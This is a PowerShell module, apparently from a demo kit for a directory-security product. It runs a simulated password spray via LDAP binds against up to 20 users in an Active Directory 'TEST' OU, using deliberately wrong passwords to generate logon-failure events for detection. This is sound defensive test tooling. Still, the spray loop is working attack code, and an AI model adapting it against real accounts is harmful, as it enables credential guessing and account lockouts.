################################################################################
##
## DSP-Demo-Activity-07-PasswordSpray.psm1
## VERSION: 2.0
##
## Password spray attack using LDAP bind (generates proper 4625 events)
##
## Uses System.DirectoryServices DirectoryEntry LDAP binding to attempt
## authentication with bad passwords. This properly triggers auth failure
## events (4625) that DSP can detect.
##
################################################################################

#Requires -Version 5.1
#Requires -Modules ActiveDirectory

################################################################################
# HELPER FUNCTIONS
################################################################################

function Write-ActivityHeader {
    param([string]$Title)
    Write-Host ""
    Write-Host ("+--" + ("-" * 62) + "--+") -ForegroundColor Cyan
    Write-Host ("| " + $Title.PadRight(62) + " |") -ForegroundColor Cyan
    Write-Host ("+--" + ("-" * 62) + "--+") -ForegroundColor Cyan
    Write-Host ""
}

function Write-Status {
    param(
        [string]$Message,
        [ValidateSet('Info','Success','Warning','Error')]
        [string]$Level = 'Info'
    )
    
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $colors = @{
        'Info'    = 'White'
        'Success' = 'Green'
        'Warning' = 'Yellow'
        'Error'   = 'Red'
    }
    
    $color = $colors[$Level]
    Write-Host "[$timestamp] [$Level] $Message" -ForegroundColor $color
}

################################################################################
# MAIN FUNCTION
################################################################################

function Invoke-PasswordSpray {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [hashtable]$Config,
        
        [Parameter(Mandatory=$true)]
        [PSCustomObject]$Environment
    )
    
    Write-ActivityHeader "Security - Password Spray Attack"
    
    $sprayAttempts = 0
    $errorCount = 0
    
    $DomainInfo = $Environment.DomainInfo    
    $domainDN = $domainInfo.DN
    $dcName = $Environment.PrimaryDC
    
    if (-not $dcName) {
        Write-Status "No primary domain controller found in environment" -Level Error
        Write-Host ""
        return $false
    }
    
    # Define test passwords for spray
    $testPasswords = @(
        "SomeP@sswordGu3ss!1",
        "SomeP@sswordGu3ss!2",
        "SomeP@sswordGu3ss!3",
        "SomeP@sswordGu3ss!4",
        "SomeP@sswordGu3ss!5",
        "SomeP@sswordGu3ss!6",
        "SomeP@sswordGu3ss!7",
        "SomeP@sswordGu3ss!8",
        "SomeP@sswordGu3ss!9",
        "SomeP@sswordGu3ss!10"
    )
    
    try {
        # Find TEST OU
        $testOU = Get-ADOrganizationalUnit -Filter { Name -eq "TEST" } -SearchBase $domainDN -ErrorAction SilentlyContinue
        
        if (-not $testOU) {
            Write-Status "TEST OU not found" -Level Warning
            Write-Host ""
            return $true
        }
        
        Write-Status "Found TEST OU: $($testOU.DistinguishedName)" -Level Info
        Write-Status "Target DC: $dcName" -Level Info
        Write-Host ""
        
        # Get all enabled users from TEST OU
        $testUsers = Get-ADUser -Filter { Enabled -eq $true } -SearchBase $testOU.DistinguishedName -ErrorAction Stop
        
        if (-not $testUsers) {
            Write-Status "No enabled users found in TEST OU" -Level Warning
            Write-Host ""
            return $true
        }
        
        # Select up to 20 random users (increased from 5)
        if ($testUsers -is [array]) {
            $selectedUsers = $testUsers | Get-Random -Count ([Math]::Min(20, $testUsers.Count))
        }
        else {
            $selectedUsers = @($testUsers)
        }
        
        Write-Status "Targeting $($selectedUsers.Count) user(s) with password spray" -Level Info
        Write-Host ""
        
        foreach ($user in $selectedUsers) {
            Write-Status "Spraying user: $($user.SamAccountName)" -Level Info
            
            # Use each password twice per user (increased from 1x)
            foreach ($password in $testPasswords) {
                for ($attempt = 1; $attempt -le 2; $attempt++) {
                try {
                    # Use LDAP bind to attempt authentication with bad password
                    # This properly generates 4625 (logon failure) events in Security log
                    $de = New-Object System.DirectoryServices.DirectoryEntry(
                        "LDAP://$dcName",
                        "$($user.SamAccountName)",
                        $password,
                        [System.DirectoryServices.AuthenticationTypes]::Secure
                    )
                    
                    # Force authentication to occur
                    $root = $de.Children | Out-Null
                    $sprayAttempts++
                }
                catch {
                    # Expected - auth attempt failed. This is what generates the event.
                    $sprayAttempts++
                }
                
                Start-Sleep -Milliseconds 100
                }
            }
            
            Write-Status "Completed 20 attempts against $($user.SamAccountName)" -Level Success
        }
        
        Write-Host ""
        Write-Status "Completed password spray attack" -Level Success
        
        # Trigger replication
        Write-Status "Triggering replication..." -Level Info
        try {
            Repadmin /syncall $dcName /APe 2>$null | Out-Null
            Start-Sleep -Seconds 3
            Write-Status "Replication triggered" -Level Success
        }
        catch {
            Write-Status "Warning: Could not trigger replication: $_" -Level Warning
        }
    }
    catch {
        Write-Status "Fatal error: $_" -Level Error
        $errorCount++
    }
    
    # Summary
    Write-Host ""
    Write-Status "Spray attempts: $sprayAttempts, Errors: $errorCount" -Level Info
    
    if ($errorCount -eq 0) {
        Write-Status "Password Spray completed successfully" -Level Success
    }
    else {
        Write-Status "Password Spray completed with $errorCount error(s)" -Level Warning
    }
    
    Write-Host ""
    return $true
}

Export-ModuleMember -Function Invoke-PasswordSpray